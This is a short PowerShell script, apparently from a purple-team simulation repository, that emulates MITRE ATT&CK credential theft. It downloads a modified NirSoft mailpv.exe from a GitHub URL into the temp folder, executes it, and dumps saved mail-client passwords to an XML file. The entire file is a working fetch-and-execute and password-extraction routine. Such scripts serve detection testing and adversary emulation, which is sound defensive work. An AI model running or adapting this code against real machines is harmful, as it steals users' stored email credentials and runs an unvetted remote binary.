<#
    T1588.002 - Obtain Capabilities: Tool
    T1555 - Credentials from Password Stores
    T1114.001 - Email Collection: Local Email Collection
    Extract passwords from some mail client with Nirsoft tool mailpv.exe
    Download  mailpv.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/mailpv.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

# Download and execute mailpv.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/mailpv.exe"
$dumpfile = "$env:tmp\mailpasswords.xml"
$outfile = "$env:tmp\mailpass.exe"
try {
    Invoke-WebRequest $url -OutFile $outfile 
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: mailpv.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download mailpv.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Mail passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Mail passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "Erorr: $_"
}

Stop-Transcript
